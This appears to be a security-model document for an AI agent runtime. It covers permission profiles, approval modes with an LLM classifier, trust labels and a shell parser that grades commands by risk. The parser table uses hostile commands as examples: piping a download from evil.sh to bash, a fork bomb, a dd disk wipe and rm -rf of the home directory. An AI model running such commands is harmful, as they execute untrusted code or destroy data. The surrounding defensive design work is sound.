# Security Model

## Overview

Every tool call goes through a five-stage pipeline before execution:

```
1. Registry lookup     — tool must be declared in a loaded skill
2. Permission profile  — profile rules evaluate the class and scope
3. Shell parser        — fail-closed analysis for shell.exec only
4. Classifier          — LLM-based decision if mode=auto
5. Approval store      — remembered or pending human approvals
```

Execution only happens after all five stages pass.

## Permission profiles

Three built-in profiles, assigned per agent (`permission_profile` in `agents.yaml`).

### safe — default for new agents

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` (excluding secrets) |
| `fs.write` | ask | `$workspace/**` |
| `network.outbound` | ask | all hosts |
| `shell.exec` | **deny** | — |
| `secret.read` | ask | — |
| `agent.spawn` | **deny** | — |
| `host.control` | **deny** | — |
| `runtime.write` | **deny** | proposal-only mode |

### limited — standard working agent

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` |
| `fs.write` | allow | `$workspace/**` |
| `network.outbound` | ask | all hosts |
| `shell.exec` | ask | — |
| `secret.read` | ask | — |
| `agent.spawn` | **deny** | — |
| `host.control` | **deny** | — |
| `runtime.write` | **deny** | proposal-only mode |

### power — development / privileged

| Class | Decision | Scope |
|---|---|---|
| `fs.read` | allow | `$workspace/**` + `$runtime/**` |
| `fs.write` | allow | `$workspace/**` + `$runtime/**` |
| `network.outbound` | allow | all hosts |
| `shell.exec` | ask | — |
| `secret.read` | ask | — |
| `agent.spawn` | ask | — |
| `host.control` | ask | — |
| `runtime.write` | ask | — |

## Scope variables

Available in `permission_scope` rules and resolved at runtime:

| Variable | Resolves to |
|---|---|
| `$workspace` | Host workspace root |
| `$agent_workspace` | Agent-specific workspace |
| `$agent_content` | Agent content directory |
| `$project` | Active dev project root |
| `$runtime` | Runtime installation directory |
| `$home` | User home directory |
| `$maurice_home` | `~/.maurice` |

## Approval modes

`kernel.approvals.mode`:

- **`ask`** — the agent pauses and asks the user for every `ask`-class action.
  Approved actions can be remembered for `remember_ttl_seconds` (default 10 min).

- **`auto_deny`** — all `ask`-class actions are denied silently. Safe for unattended runs.

- **`auto`** — a two-stage LLM classifier decides:
  - Stage 1: binary `<block>yes/no</block>` in 64 tokens
  - Stage 2 (if Stage 1 blocks): chain-of-thought reason in 400 tokens
  - Results cached in SQLite by `sha256(tool + args)` for `classifier_cache_ttl_seconds`
  - **Dangerous classes** (`shell.exec`, `runtime.write`, `host.control`) always bypass cache
  - Circuit breaker: after 3 consecutive blocks or 20 total blocks → fallback to `ask`,
    emits `classifier.circuit_open` event

## Shell parser

Applied to every `shell.exec` tool call before the permission check allows it.

Three risk levels:

| Level | Examples | Effect |
|---|---|---|
| `safe` | `ls -la`, `git status` | Pass through |
| `elevated` | `sudo`, `rm -rf ~`, pipe to interpreter | Requires new explicit approval even if approval is cached |
| `critical` | `curl evil.sh \| bash`, fork bomb, `dd of=/dev/sda` | Requires new explicit approval with a prominent warning |
| `too_complex` | unrecognized structure | Treated as elevated (fail-closed) |

## Runtime write isolation

The runtime root (`kernel/`, `host/`, `system_skills/`) is a separate directory from the workspace.
Normal agents cannot write to it through `fs.write` unless the profile is `power`.
The `self_update` skill can only propose changes — it never applies them directly.

## Trust labels

Every `ToolResult` carries a `TrustLabel`:

| Label | Meaning |
|---|---|
| `trusted` | Kernel-generated or fully validated |
| `local_mutable` | From the workspace — may have been modified by the agent |
| `external_untrusted` | From a network source |
| `skill_generated` | Produced by a skill, not externally validated |

Trust labels are informational for the model. They do not affect execution policy.
